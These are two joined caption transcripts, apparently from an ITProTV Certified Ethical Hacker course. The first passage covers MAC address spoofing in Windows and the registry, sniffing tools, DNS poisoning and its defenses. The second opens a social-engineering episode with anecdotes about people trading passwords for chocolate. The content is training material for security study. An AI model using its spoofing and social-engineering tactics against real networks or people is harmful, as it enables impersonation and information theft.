just hold on one second,\nthat is not the right one.\n\n794\n00:37:26.060 --> 00:37:29.871\nHold on one second here.\n\n795\n00:37:29.871 --> 00:37:32.455\n&gt;&gt; So we talked about several\ndifferent ways we could change it or\n\n796\n00:37:32.455 --> 00:37:34.840\na couple different ways we\ncould change the MAC address,\n\n797\n00:37:34.840 --> 00:37:36.795\nwe've got software that\nwe can use like SMAC.\n\n798\n00:37:36.795 --> 00:37:40.908\nBut then through the Windows interface\nnow, I wanna say it was Windows 8.1.\n\n799\n00:37:40.908 --> 00:37:43.937\n&gt;&gt; Windows 8, 8.1, 10.\n\n800\n00:37:43.937 --> 00:37:47.148\n[CROSSTALK] Well yeah, so the problem is,\n\n801\n00:37:47.148 --> 00:37:51.201\nit's like half the screen,\nright, so it cuts off.\n\n802\n00:37:51.201 --> 00:37:54.622\nSo can we just go to the demo machine for\na second, we could see it but\n\n803\n00:37:54.622 --> 00:37:56.470\nit just may not be real easy to tell.\n\n804\n00:37:56.470 --> 00:37:59.080\nSo I know it may be hard to see it and\nI can't make it bigger.\n\n805\n00:37:59.080 --> 00:38:01.840\nBut what I did is I brought up\nthe properties of the adapter.\n\n806\n00:38:01.840 --> 00:38:06.530\nSo I'm looking at the ASIX Broadcom\nadapter or whatever it is in there.\n\n807\n00:38:06.530 --> 00:38:09.770\nAnd I just go to the properties of it,\ngo to Advanced, right?\n\n808\n00:38:09.770 --> 00:38:12.710\nSo I'm on the Advanced tab, I'm about\nhalfway down in the property list,\n\n809\n00:38:12.710 --> 00:38:13.790\nNetwork Address.\n\n810\n00:38:13.790 --> 00:38:16.030\nAnd this is what I was talking about,\nit kind of cuts off here.\n\n811\n00:38:16.030 --> 00:38:17.200\nBut I can do Value and\n\n812\n00:38:17.200 --> 00:38:20.900\nI can actually program in the MAC\naddress right here on the Value side.\n\n813\n00:38:20.900 --> 00:38:22.990\nAnd so I could actually type it\nin right there if I wanted to.\n\n814\n00:38:22.990 --> 00:38:26.980\nAnd I could put in a Mac address, that\nwould actually allow me to program it in.\n\n815\n00:38:26.980 --> 00:38:29.691\nSo in Windows 8 going forward,\nI have that capability.\n\n816\n00:38:29.691 --> 00:38:32.732\nSo that's new, because we don't expose\nthat in prior versions of the OS.\n\n817\n00:38:32.732 --> 00:38:35.391\nBut we do here but I could also do it\nin the registry, and I just wanted\n\n818\n00:38:35.391 --> 00:38:38.935\nto point out that well, we talked about\nit but we didn't actually show it to you.\n\n819\n00:38:38.935 --> 00:38:41.405\nWe said hey, you could do it but\nwe didn't show you where to go, right?\n\n820\n00:38:41.405 --> 00:38:44.080\nSo just looking at that and\nunderstanding that we could do that there.\n\n821\n00:38:44.080 --> 00:38:45.828\nWe could do it in the registry as well.\n\n822\n00:38:45.828 --> 00:38:51.045\nWe could go in, type regedit32, go in,\nand then we would go into the h-key local\n\n823\n00:38:51.045 --> 00:38:56.700\nmachine, system current control set,\ncontrol, class, are you getting all this?\n\n824\n00:38:56.700 --> 00:39:01.800\nAnd then the actual identifier,\nwhich is a 36 digit\n\n825\n00:39:01.800 --> 00:39:06.880\nhex or alphanumeric string to\nfind the appropriate identifier.\n\n826\n00:39:06.880 --> 00:39:10.430\nWe than go and find the four digit sub\nkey that represents the network adapter.\n\n827\n00:39:10.430 --> 00:39:12.725\nIt's like a pain in the ass\nto go figure all this out.\n\n828\n00:39:12.725 --> 00:39:16.040\nBut you go through, drill down and you\nactually could find the network adapter,\n\n829\n00:39:16.040 --> 00:39:16.928\nadapter by adapter.\n\n830\n00:39:16.928 --> 00:39:21.027\nAnd then in there, you can go in and\nsearch for driver description, the key for\n\n831\n00:39:21.027 --> 00:39:25.230\nthe driver description, and then we can\ngo in, and we can actually edit that.\n\n832\n00:39:25.230 --> 00:39:26.970\nAnd we can actually add in a value there.\n\n833\n00:39:26.970 --> 00:39:29.398\nSo it would be the same thing essentially\nas doing it in the interface but\n\n834\n00:39:29.398 --> 00:39:30.590\ndoing it from the registry.\n\n835\n00:39:30.590 --> 00:39:33.110\nThat's the old school way of\ndoing it in Windows 7 and\n\n836\n00:39:33.110 --> 00:39:35.900\ntool areas like where we\ndidn't expose it directly.\n\n837\n00:39:35.900 --> 00:39:40.370\nWe could use the tools that I showed you,\nSMAC and MAC Address Changer and\n\n838\n00:39:40.370 --> 00:39:41.620\nall that kinda stuff.\n\n839\n00:39:41.620 --> 00:39:43.342\nSo we could do any or all of those things.\n\n840\n00:39:43.342 --> 00:39:46.810\nIt would really just depend on the nature\nof the OS that we're using and\n\n841\n00:39:46.810 --> 00:39:50.980\nhow we would ultimately wanna go in and\napproach that, right?\n\n842\n00:39:50.980 --> 00:39:55.103\nWe've talked a bit about DNS poisoning as\nwell and the issues associated with that.\n\n843\n00:39:55.103 --> 00:39:58.721\nDNS spoofing and DNS cache poisoning\nare also attacks that under sniffing,\n\n844\n00:39:58.721 --> 00:40:00.256\nwe'd wanna be concerned with.\n\n845\n00:40:00.256 --> 00:40:03.749\nWe did talk about having knowledge\nof the IP config command, and\n\n846\n00:40:03.749 --> 00:40:06.659\nlooking at the display DNS sub command or\nthe switch,\n\n847\n00:40:06.659 --> 00:40:09.280\nto be able to look at\nthe DNS resolver cache.\n\n848\n00:40:09.280 --> 00:40:11.570\nWe talked about the need to be\naware of the host file, and\n\n849\n00:40:11.570 --> 00:40:15.610\nthe fact that we do resolution locally\nfirst, and then remotely second.\n\n850\n00:40:15.610 --> 00:40:19.190\nAnd if we can do any poisoning there,\nthat can be a problem.\n\n851\n00:40:19.190 --> 00:40:21.200\nSo cache poisoning is a big deal.\n\n852\n00:40:21.200 --> 00:40:23.270\nWe're adding forged DNS records in.\n\n853\n00:40:23.270 --> 00:40:25.020\nDNS sec is often overlooked here but\n\n854\n00:40:25.020 --> 00:40:28.780\nDNS sec would allow us to be able\nto defend against DNS spoofing.\n\n855\n00:40:28.780 --> 00:40:32.260\nWe could do all DNS queries local\nto a DNS server that we control,\n\n856\n00:40:32.260 --> 00:40:35.080\nblock DNS requests from being forward and\npropagated out.\n\n857\n00:40:35.080 --> 00:40:37.110\nSo you'll only resolve locally.\n\n858\n00:40:37.110 --> 00:40:40.020\nMake sure the firewall restricts\nexternal DNS look ups.\n\n859\n00:40:40.020 --> 00:40:41.890\nWe should implement DNS sec.\n\n860\n00:40:41.890 --> 00:40:44.690\nImplement an IDS to monitor or\nIPS to monitor.\n\n861\n00:40:44.690 --> 00:40:49.300\nConfigure DNS resolvers to randomly use\na new source port by mapping to different\n\n862\n00:40:49.300 --> 00:40:52.950\nports, so it's harder to catch them,\nand to look at that kinda stuff.\n\n863\n00:40:52.950 --> 00:40:56.180\nThese are all different ways\nthat we can safeguard DNS.\n\n864\n00:40:56.180 --> 00:40:57.870\nWe can use DNS.NonExistentDomain,\n\n865\n00:40:57.870 --> 00:41:02.140\nwhat are called NXDOMAIN rate limiting\nsolutions as well, to be able to prevent\n\n866\n00:41:02.140 --> 00:41:05.860\nNonExistentDomains from being able\nto be looked at and discussed.\n\n867\n00:41:05.860 --> 00:41:08.370\nSo there's a lot of different\napproaches on the DNS side.\n\n868\n00:41:08.370 --> 00:41:09.990\nWe talked about sniffing tools as well.\n\n869\n00:41:09.990 --> 00:41:11.100\nWe looked at Wireshark.\n\n870\n00:41:11.100 --> 00:41:14.540\nAnd I mentioned Ettercap and\nsome of the other tools.\n\n871\n00:41:14.540 --> 00:41:18.070\nWe didn't demo all of them\nalthough we did use Sniff-O-Matic,\n\n872\n00:41:18.070 --> 00:41:20.760\nwhich I know was a favorite of Mike's.\n\n873\n00:41:20.760 --> 00:41:24.814\nA very,\nvery popular tool in the Mike household.\n\n874\n00:41:24.814 --> 00:41:28.060\nBut you can use any of these\nsniffing tools, I mentioned the,\n\n875\n00:41:28.060 --> 00:41:30.633\ndid you ever find the URL for\nNetwork Chemistry?\n\n876\n00:41:30.633 --> 00:41:34.619\nI know you were looking for it but-\n&gt;&gt; They had moved it to, where was it,\n\n877\n00:41:34.619 --> 00:41:37.361\nNetwork Chemistry doesn't\nseem to be there anymore.\n\n878\n00:41:37.361 --> 00:41:38.673\nIs that crazy?\n\n879\n00:41:38.673 --> 00:41:40.450\n&gt;&gt; It is-\n&gt;&gt; Packetizer is now-\n\n880\n00:41:40.450 --> 00:41:41.100\n&gt;&gt; Packetizer.\n\n881\n00:41:41.100 --> 00:41:41.758\n&gt;&gt; SourceForge.\n\n882\n00:41:41.758 --> 00:41:43.768\n&gt;&gt; Right, yeah, you can get it on\nSourceForge, yeah, but it's Packetizer.\n\n883\n00:41:43.768 --> 00:41:45.092\nYeah I don't think they're-\n&gt;&gt; I was gonna double check\n\n884\n00:41:45.092 --> 00:41:45.633\nwith you to make sure.\n\n885\n00:41:45.633 --> 00:41:48.068\n&gt;&gt; I don't think they're\nin business per se.\n\n886\n00:41:48.068 --> 00:41:48.674\n&gt;&gt; Yep.\n\n887\n00:41:48.674 --> 00:41:50.683\n&gt;&gt; But they do have it,\nit is up on SourceForge.\n\n888\n00:41:50.683 --> 00:41:52.428\n&gt;&gt; Then I will go there to find-\n&gt;&gt; And you can find it there but\n\n889\n00:41:52.428 --> 00:41:53.715\nthat's actually a really cool one.\n\n890\n00:41:53.715 --> 00:41:56.851\nSo you can look at that,\nthere's the Capsa network analyzer.\n\n891\n00:41:56.851 --> 00:42:01.849\nThere's TCP dump which is the Linux Unix\nversion of, or Win dump which is the TCP,\n\n892\n00:42:01.849 --> 00:42:03.231\nlet me try that again.\n\n893\n00:42:03.231 --> 00:42:05.059\n&gt;&gt; [LAUGH]\n&gt;&gt; Win dump which is the Windows port\n\n894\n00:42:05.059 --> 00:42:07.345\nof the TCP dump tool,\nis what I'm trying to say, on Linux Unix.\n\n895\n00:42:07.345 --> 00:42:10.719\nThese are command line kinda old\nschool versions of these tools that\n\n896\n00:42:10.719 --> 00:42:12.900\nwe can use for just raw packet capturing.\n\n897\n00:42:12.900 --> 00:42:15.310\nSo there's lots of different\nstuff we can look at there.\n\n898\n00:42:15.310 --> 00:42:18.728\nA lot of people talk about Omnipeek, which\nis another big one that's been around\n\n899\n00:42:18.728 --> 00:42:20.601\nforever, we mentioned Sniff-O-Matic.\n\n900\n00:42:20.601 --> 00:42:24.204\nJust a bunch of these different tools\nthat can be used there, tons and tons and\n\n901\n00:42:24.204 --> 00:42:25.200\ntons of tools.\n\n902\n00:42:25.200 --> 00:42:28.445\nWe've talked about countermeasures and\nhow to defend in general.\n\n903\n00:42:28.445 --> 00:42:30.575\nKeep in mind,\njust common sense stuff, right?\n\n904\n00:42:30.575 --> 00:42:32.456\nUsing secure protocols that'll tunnel and\n\n905\n00:42:32.456 --> 00:42:34.495\nencrypt as opposed to\nunencrypted solutions.\n\n906\n00:42:34.495 --> 00:42:37.165\nSo never use telnet, use SSH.\n\n907\n00:42:37.165 --> 00:42:39.755\nNever HTTP when you can use HTTPS, right?\n\n908\n00:42:39.755 --> 00:42:41.915\nThose kinds of things\nare always important.\n\n909\n00:42:41.915 --> 00:42:43.539\nUse a switch instead of a hub.\n\n910\n00:42:43.539 --> 00:42:47.489\nAlthough today I don't really think that\nis something that we would have to remind\n\n911\n00:42:47.489 --> 00:42:48.243\nanybody to do.\n\n912\n00:42:48.243 --> 00:42:52.120\nI'd love to you if you're using hubs,\nbut we do have a better way today.\n\n913\n00:42:52.120 --> 00:42:55.560\nAnd we can probably get together\na little crowdfunding or something for\n\n914\n00:42:55.560 --> 00:42:58.440\nyou to buy a couple of\nswitches if that's the case.\n\n915\n00:42:58.440 --> 00:43:02.390\nBut use things like secure\nFTP instead of FTP.\n\n916\n00:43:02.390 --> 00:43:04.885\nPeople often forget there\nis a secure version of FTP.\n\n917\n00:43:04.885 --> 00:43:07.890\nThere's a secure version of IMAP,\na secure version of POP,\n\n918\n00:43:07.890 --> 00:43:12.130\nthat kind of stuff if you're using\nthose protocols, and send in the clear.\n\n919\n00:43:12.130 --> 00:43:15.135\nMaking sure we're doing that,\nstrong encryption protocols.\n\n920\n00:43:15.135 --> 00:43:18.840\nWe'll talk about in the wireless\ndiscussions coming up in other episodes,\n\n921\n00:43:18.840 --> 00:43:22.760\nnot using WEP, and not using DEFs for\ninstance as a protocol these days,\n\n922\n00:43:22.760 --> 00:43:25.720\nor triple DEFs but using WPA2 Enterprise.\n\n923\n00:43:25.720 --> 00:43:28.060\nAnd using AES as an alternative,\n\n924\n00:43:28.060 --> 00:43:32.610\nstaying away from things like RC4 in favor\nof newer protocols and newer algorithms.\n\n925\n00:43:32.610 --> 00:43:35.500\nSo these are the kinda\nthings we wanna think about.\n\n926\n00:43:35.500 --> 00:43:40.010\nMaking sure that we use tools that\nwill support secure communication.\n\n927\n00:43:40.010 --> 00:43:43.750\nSo applications that are cryptographically\naware and support our\n\n928\n00:43:43.750 --> 00:43:47.540\nspecific needs are always gonna be\nimported in this conversation as well.\n\n929\n00:43:47.540 --> 00:43:50.970\nAnd when we think about how to detect\nsniffing, we talked about looking for\n\n930\n00:43:50.970 --> 00:43:52.430\npromiscuous mode behavior, right?\n\n931\n00:43:52.430 --> 00:43:54.790\nThis is probably the best thing\nwe can think about doing.\n\n932\n00:43:54.790 --> 00:43:59.790\nRunning IDSs that will scan our network\nlooking for suspicious traffic.\n\n933\n00:43:59.790 --> 00:44:02.440\nPort scanning locally to understand\nwhat ports are being opened and\n\n934\n00:44:02.440 --> 00:44:04.780\nclosed, to understand what's happening.\n\n935\n00:44:04.780 --> 00:44:07.900\nThere's all these things we can do, but\nit comes back to the basic concepts\n\n936\n00:44:07.900 --> 00:44:10.970\nof the blocking and tackling of network\nsecurity that we often engage in.\n\n937\n00:44:10.970 --> 00:44:14.620\nAnd unfortunately, to our detriment as\ndefenders, sometimes take for granted and\n\n938\n00:44:14.620 --> 00:44:16.090\nforget to validate it's happening.\n\n939\n00:44:16.090 --> 00:44:20.110\nWhich is obviously a big deal as\nwe wrap up our conversations here.\n\n940\n00:44:20.110 --> 00:44:24.300\n&gt;&gt; All right, Adam, a great way to wrap\nup our conversation on sniffing, right?\n\n941\n00:44:24.300 --> 00:44:27.090\nWe took a look at a couple\nof different concepts there.\n\n942\n00:44:27.090 --> 00:44:29.980\nTalked about switches, and\nthe way we could modify,\n\n943\n00:44:29.980 --> 00:44:31.890\nnot modify, but kinda overload,\n\n944\n00:44:31.890 --> 00:44:37.000\nor do basically a buffer overflow on\nthat CAM table those switches keep.\n\n945\n00:44:37.000 --> 00:44:38.320\nAnd a lot of great stuff there.\n\n946\n00:44:38.320 --> 00:44:40.859\nEven demoed how to change your\nMAC address within the Windows\n\n947\n00:44:40.859 --> 00:44:43.444\ninterface now with Windows 8.1 and 10-\n&gt;&gt; That was Windows 10 we actually\n\n948\n00:44:43.444 --> 00:44:43.985\ndid it on, Windows 10.\n\n949\n00:44:43.985 --> 00:44:45.900\nAll the latest and greatest.\n\n950\n00:44:45.900 --> 00:44:47.380\n&gt;&gt; Yes, absolutely.\n\n951\n00:44:47.380 --> 00:44:48.660\nAnd let's see, what else.\n\n952\n00:44:48.660 --> 00:44:51.220\nWe talked a little bit\nabout keeping DHCP and\n\n953\n00:44:51.220 --> 00:44:53.930\nDNS, how we can try to\nkeep those secure as well.\n\n954\n00:44:53.930 --> 00:44:55.260\nSo we appreciate that, Adam.\n\n955\n00:44:55.260 --> 00:44:57.310\nHope everybody out there enjoyed watching.\n\n956\n00:44:57.310 --> 00:45:00.170\nSigning off for ITProTV, I'm Mike Rodrick.\n\n957\n00:45:00.170 --> 00:45:01.489\n&gt;&gt; I'm an art packet.\n\n958\n00:45:01.489 --> 00:45:03.843\n&gt;&gt; And we'll see you next time.\n\n959\n00:45:03.843 --> 00:45:12.350\n[SOUND]\n\n",

00:00:19.881\nI'm your host, Mike Rodrick, and\ntoday we're doing CEH Version Nine.\n\n4\n00:00:19.881 --> 00:00:21.727\nAnd specifically in this episode,\n\n5\n00:00:21.727 --> 00:00:24.993\nwe're gonna be getting into\nthe world of social engineering.\n\n6\n00:00:24.993 --> 00:00:29.930\nAnd here to explain to us what that is and\nhow it can be used, is Mr. Adam Gordon.\n\n7\n00:00:29.930 --> 00:00:30.950\nHow you doing, Adam?\n>> I'm good.\n\n8\n00:00:30.950 --> 00:00:31.490\nI'm good.\n\n9\n00:00:31.490 --> 00:00:35.660\nThank you for inviting me here to\nspend some time with you today.\n\n10\n00:00:35.660 --> 00:00:39.260\nSo, when we think about social\nengineering, we think about the art,\n\n11\n00:00:39.260 --> 00:00:44.030\nthe science of being able to talk to\npeople, get information from them.\n\n12\n00:00:44.030 --> 00:00:46.940\nBut the trick is, without them necessarily\nknowing that we're doing that.\n\n13\n00:00:46.940 --> 00:00:51.150\nAnd so, we often spend a lot\nof time talking to people.\n\n14\n00:00:51.150 --> 00:00:55.000\nAt least I do, I'm sure a lot of you do\ngiven what we try to do for a living.\n\n15\n00:00:55.000 --> 00:00:59.125\nTalking to people about problems or\nconcerns they have in just normal,\n\n16\n00:00:59.125 --> 00:01:01.955\nnon-security focused behavior and\nactivity.\n\n17\n00:01:01.955 --> 00:01:04.082\nWe talk to people about\njust common things.\n\n18\n00:01:04.082 --> 00:01:05.590\nHey, where are you from?\n\n19\n00:01:05.590 --> 00:01:06.250\nWhat do you like?\n\n20\n00:01:06.250 --> 00:01:07.340\nWhat's your favorite food?\n\n21\n00:01:07.340 --> 00:01:08.880\nWhatever that may be.\n\n22\n00:01:08.880 --> 00:01:13.080\nAnd well, a lot of that is just\nessentially stuff that comes and goes,\n\n23\n00:01:13.080 --> 00:01:14.190\nwe don't pay a lot of attention to it.\n\n24\n00:01:14.190 --> 00:01:16.197\nIt may not really be all that meaningful.\n\n25\n00:01:16.197 --> 00:01:19.098\nThe person that's really good at social\nengineering is the person that pays\n\n26\n00:01:19.098 --> 00:01:20.245\nattention to those details.\n\n27\n00:01:20.245 --> 00:01:23.520\nStores them away and\nis able to recall them if needed.\n\n28\n00:01:23.520 --> 00:01:24.530\nAnd piece together,\n\n29\n00:01:24.530 --> 00:01:28.500\nessentially aggregate that information\ninto something that may be meaningful.\n\n30\n00:01:28.500 --> 00:01:32.070\nWe've talked a lot in prior episodes\nabout how we eat the elephant, right?\n\n31\n00:01:32.070 --> 00:01:33.110\nI keep referring to that and\n\n32\n00:01:33.110 --> 00:01:37.060\ntalking about the fact that information\nsecurity, especially ethical hacking,\n\n33\n00:01:37.060 --> 00:01:41.790\nis really the job of one byte\nat a time getting information.\n\n34\n00:01:41.790 --> 00:01:44.900\nOne byte at a time figuring out\nwhat that information means and\n\n35\n00:01:44.900 --> 00:01:46.960\ndropping it in place to build the picture.\n\n36\n00:01:46.960 --> 00:01:51.720\nOne byte at a time taking that picture and\nthen leveraging it to be able to use and\n\n37\n00:01:51.720 --> 00:01:53.750\nmove to the next level, the tool,\n\n38\n00:01:53.750 --> 00:01:57.100\nthe information, the resource,\nthe access, whatever it may be.\n\n39\n00:01:57.100 --> 00:02:01.070\nSocial engineering is really more than\nanything else the art of being human.\n\n40\n00:02:01.070 --> 00:02:03.050\nJust being able to interact and\ntalk to people.\n\n41\n00:02:03.050 --> 00:02:06.000\nThe people that are best at this are the\npeople that are just able to strike up\n\n42\n00:02:06.000 --> 00:02:09.070\na conversation, seemingly,\nrandomly, comfortably,\n\n43\n00:02:09.070 --> 00:02:11.370\nreally without any warning signs going up.\n\n44\n00:02:11.370 --> 00:02:15.700\nAnd getting people to help expose that\ninformation by convincing them to\n\n45\n00:02:15.700 --> 00:02:18.520\ntalk about things that they\nmay not realize are important.\n\n46\n00:02:18.520 --> 00:02:22.070\nThere was an interesting study\ndone in Britain a few years ago,\n\n47\n00:02:22.070 --> 00:02:25.180\nI often talk to people about this,\nwe talk about social engineering.\n\n48\n00:02:25.180 --> 00:02:27.070\nSo they went and they stopped.\n\n49\n00:02:27.070 --> 00:02:31.170\nThey being the security research\nfirm that was doing the survey.\n\n50\n00:02:31.170 --> 00:02:35.996\nStopped randomly people out on the street,\nwalking around in London.\n\n51\n00:02:35.996 --> 00:02:39.200\nAnd they said, we have a question,\na serious question we wanna ask you.\n\n52\n00:02:39.200 --> 00:02:41.344\nOkay, if you're willing to\nspend five minutes, great.\n\n53\n00:02:41.344 --> 00:02:45.494\nSo they asked a series of innocuous\nquestions, and at some point they said.\n\n54\n00:02:45.494 --> 00:02:49.337\nWhat would it take us,\nif we were to offer you something.\n\n55\n00:02:49.337 --> 00:02:52.789\nWhat would it take us,\nwhat would we have to offer you for\n\n56\n00:02:52.789 --> 00:02:55.880\nyou to give us your password\nto your logon at work.\n\n57\n00:02:55.880 --> 00:02:57.088\nTo your email account?\n\n58\n00:02:57.088 --> 00:02:58.980\nThey went through different scenarios.\n\n59\n00:02:58.980 --> 00:03:01.185\nAnd essentially, and\nthey offered different things, right?\n\n60\n00:03:01.185 --> 00:03:04.030\nThey basically had a series of\nthings they were willing to offer.\n\n61\n00:03:04.030 --> 00:03:06.850\nHey, yeah we'll give you\nthis bright shiny pen.\n\n62\n00:03:06.850 --> 00:03:07.830\nRight?\nOr hey,\n\n63\n00:03:07.830 --> 00:03:10.560\nwe'll give you two pens,\ncuz two is better than one.\n\n64\n00:03:10.560 --> 00:03:11.534\nOr we'll give you all sorts.\n\n65\n00:03:11.534 --> 00:03:12.539\nYeah, they went through a list of things.\n\n66\n00:03:12.539 --> 00:03:15.959\nAnd the common denominator,\nwhich was fascinating and\n\n67\n00:03:15.959 --> 00:03:19.095\nis also incredibly scary at the same time,\nright?\n\n68\n00:03:19.095 --> 00:03:22.235\nAnd I don't think is a UK,\nBritain only thing by any means.\n\n69\n00:03:22.235 --> 00:03:23.815\nI think this is a human thing.\n\n70\n00:03:23.815 --> 00:03:25.150\nBut it's really scary.\n\n71\n00:03:25.150 --> 00:03:28.110\nThe lowest common denominator\nwas a Snicker's candy bar.\n\n72\n00:03:28.110 --> 00:03:28.690\n>> Really?\n\n73\n00:03:28.690 --> 00:03:29.540\n>> Yeah, or the equivalent.\n\n74\n00:03:29.540 --> 00:03:30.210\nWhatever it would've been.\n\n75\n00:03:30.210 --> 00:03:30.750\nBut a candy bar.\n\n76\n00:03:30.750 --> 00:03:33.620\nBut essentially it was, we'll give\nyou a piece of chocolate, right?\n\n77\n00:03:33.620 --> 00:03:35.550\nAnd essentially if you give\nme a piece of chocolate.\n\n78\n00:03:35.550 --> 00:03:37.725\nMost people would've sold their soul.\n\n79\n00:03:37.725 --> 00:03:41.107\n>> [LAUGH]\n>> They gave up usernames, passwords,\n\n80\n00:03:41.107 --> 00:03:44.200\nwhere the boss lives, you name it.\n\n81\n00:03:44.200 --> 00:03:46.670\nAnything they knew,\ngive them a chocolate bar.\n\n82\n00:03:46.670 --> 00:03:48.970\nAnd then granted Cadbury's chocolate,\ngood chocolate, right?\n\n83\n00:03:48.970 --> 00:03:50.638\nThe British make good chocolate.\n\n84\n00:03:50.638 --> 00:03:52.865\nBut, the reality is for\na piece of chocolate,\n\n85\n00:03:52.865 --> 00:03:55.561\nthey essentially were willing\nto sell themselves out.\n\n86\n00:03:55.561 --> 00:03:58.220\nSo it may be hard sometimes, right?\n\n87\n00:03:58.220 --> 00:04:01.232\nIt may be hard sometimes to\nbe able to stop this kind\n\n88\n00:04:01.232 --> 00:04:04.979\nof stuff from happening when\nchocolate is widely available.\n\n89\n00:04:04.979 --> 00:04:07.079\nAlthough actually this past year,\nit's interesting.\n\n90\n00:04:07.079 --> 00:04:11.484\nI'm just an encyclopedia of\nridiculous garbage facts.\n\n91\n00:04:11.484 --> 00:04:16.200\nIf I ever, if you ever get invited to play\na game of geek trivia with me, decline.\n\n92\n00:04:16.200 --> 00:04:17.281\nI will kick your ass.\n\n93\n00:04:17.281 --> 00:04:18.048\nOkay, So.\n\n94\n00:04:18.048 --> 00:04:21.441\nBut the reality is that,\nyou have this past year especially,\n\n95\n00:04:21.441 --> 00:04:24.610\nthere was a tremendous problem\nwith the cocoa harvest.\n\n96\n00:04:24.610 --> 00:04:25.291\n>> Really?\n>> So, we talk\n\n97\n00:04:25.291 --> 00:04:27.201\nabout chocolate being around and whatever.\n\n98\n00:04:27.201 --> 00:04:29.778\nBut, and it's interesting,\nI didn't know all this about cocoa.\n\n99\n00:04:29.778 --> 00:04:35.508\nBut cocoa is an incredibly complicated\ncrop to grow, first of all, right?\n\n100\n00:04:35.508 --> 00:04:38.793\nAnd second of all, there were\nproblems with the cocoa harvest.\n\n101\n00:04:38.793 --> 00:04:43.917\nAnd as a result, it's very expensive to\nbe able to get cocoa to make chocolate.\n\n102\n00:04:43.917 --> 00:04:46.662\nBut even more so, there were\nproblems with the cocoa harvest, but\n\n103\n00:04:46.662 --> 00:04:48.991\nthere were more problems\nwith the vanilla harvest.\n\n104\n00:04:48.991 --> 00:04:51.689\n>> Really?\n>> And so, because vanilla is often used\n\n105\n00:04:51.689 --> 00:04:55.310\nto, as a spice be able to sweeten and\ndo a lot of things.\n\n106\n00:04:55.310 --> 00:04:57.470\nIt's used in certain kinds of chocolate.\n\n107\n00:04:57.470 --> 00:05:00.145\nThe price of chocolate has gone up\nbecause the price of vanilla went\n\n108\n00:05:00.145 --> 00:05:00.924\nthrough the roof.\n\n109\n00:05:00.924 --> 00:05:03.760\nVanilla is only grown in Madagascar,\nessentially.\n\n110\n00:05:03.760 --> 00:05:06.800\nThere's one or two other places in\nthe world, but basically in Madagascar.\n\n111\n00:05:06.800 --> 00:05:12.030\nAnd it's such a delicate crop it has\nto be pollinated and managed by hand.\n\n112\n00:05:12.030 --> 00:05:12.910\n>> Really.\n>> Yeah.\n\n113\n00:05:12.910 --> 00:05:14.080\n>> Wow.\n>> Because it's\n\n114\n00:05:14.080 --> 00:05:16.940\none of those things that never\nshould have existed in the wild.\n\n115\n00:05:16.940 --> 00:05:18.565\nJust like it would have died off, right?\n\n116\n00:05:18.565 --> 00:05:21.710\nThere were like two plants, and\nsomebody figured it out and saved it.\n\n117\n00:05:21.710 --> 00:05:23.860\nBut it's such a delicate process, and\n\n118\n00:05:23.860 --> 00:05:28.420\nthe time window to essentially pollinate\nthe crop is so small, that if you miss it,\n\n119\n00:05:28.420 --> 00:05:31.239\nyou're done because it only\ndoes this once a year.\n\n120\n00:05:31.239 --> 00:05:32.198\n>> Wow.\n\n121\n00:05:32.198 --> 00:05:34.882\n>> And so there were major problems\nwith the vanilla harvest this past year,\n\n122\n00:05:34.882 --> 00:05:36.745\nwhich is why the price of ice cream and\nchocolate and\n\n123\n00:05:36.745 --> 00:05:38.190\nother stuff has gone through the roof.\n\n124\n00:05:38.190 --> 00:05:38.931\n>> I'll be darned.\n\n125\n00:05:38.931 --> 00:05:41.302\n>> Yeah, really interesting stuff, right?\n\n126\n00:05:41.302 --> 00:05:43.843\nSo just totally random, totally unrelated.\n\n127\n00:05:43.843 --> 00:05:47.117\nBut in case you're wondering,\nyou now have all this useless trivia to\n\n128\n00:05:47.117 --> 00:05:49.740\nput in your head,\ninstead of important stuff, right?\n\n129\n00:05:49.740 --> 00:05:52.710\nImportant stuff like,\nwhat do I need do know for the CH exam?\n\n130\n00:05:52.710 --> 00:05:54.619\n>> Right.\n>> Cuz the price of vanilla in Madagascar\n\n131\n00:05:54.619 --> 00:05:56.001\nis not gonna be on the exam.\n\n132\n00:05:56.001 --> 00:05:57.600\n>> Darn.\n>> Unfortunately.\n\n133\n00:05:57.600 --> 00:05:59.680\nIf it was, you'd be all set,\nand how do you know?\n\n134\n00:05:59.680 --> 00:06:02.130\nBut anyway, people would sell\nthemselves out for a bar of chocolate.\n\n135\n00:06:02.130 --> 00:06:02.680\nImagine that.\n\n136\n00:06:02.680 --> 00:06:04.680\n>> It's amazing.\n\n137\n00:06:04.680 --> 00:06:05.485\n>> Unbelievable.\nAll right, so\n\n138\n00:06:05.485 --> 00:06:06.575\nwe're done with social engineering.\n\n139\n00:06:06.575 --> 00:06:07.086\nThat was just.\n\n140\n00:06:07.086 --> 00:06:08.690\nThere's nothing else to say.\n\n141\n00:06:08.690 --> 00:06:09.988\nDon't.\nPeople walk up and say,\n\n142\n00:06:09.988 --> 00:06:12.098\nI've got chocolate,\nremember Stranger Danger, right?\n\n143\n00:06:12.098 --> 00:06:13.698\nSay no.\nAnd you're good.\n\n144\n00:06:13.698 --> 00:06:15.410\nThat's all we gotta talk about\nwith social engineering.\n\n145\n00:06:15.410 --> 00:06:16.070\n>> But there really is, there is\n\n146\n00:06:16.070 --> 00:06:17.629\nan art to social engineering-\n>> There is.\n\n147\n00:06:17.629 --> 00:06:18.322\n>> To getting.\n\n148\n00:06:18.322 --> 00:06:19.853\nAnd we're taking advantage\nof human nature.\n\n149\n00:06:19.853 --> 00:06:22.687\nPeople tend to want to help people.\n\n150\n00:06:22.687 --> 00:06:24.204\nThey wanna liked by people.\n\n151\n00:06:24.204 --> 00:06:27.920\nThey wanna be perceived as popular, or-\n>> I don't.\n\n152\n00:06:27.920 --> 00:06:28.710\n>> Smart.\n\n153\n00:06:28.710 --> 00:06:30.010\n>> I wanna be known as a bastard.\n\n154\n00:06:30.010 --> 00:06:31.724\nI don't wanna be liked by anybody.\n\n155\n00:06:31.724 --> 00:06:33.090\n>> And I know Ben threw up a link.\n\n156\n00:06:33.090 --> 00:06:36.120\nThis is another one where you're\ntalking about on the street.\n\n157\n00:06:36.120 --> 00:06:36.690\n>> Yeah, yeah, yeah.\n\n158\n00:06:36.690 --> 00:06:38.458\n>> Where Jimmy Kimmel does this.\n\n159\n00:06:38.458 --> 00:06:43.252\nAnd people are just unwittingly giving\ntheir passwords out to the interviewer\n\n160\n00:06:43.252 --> 00:06:45.300\nright there on the street [COUGH].\n\n161\n00:06:45.300 --> 00:06:48.110\nHe also talks about Kevin Mitnick\nwhich we all know probably,\n\n162\n00:06:48.110 --> 00:06:50.730\na very famous hacker back in the 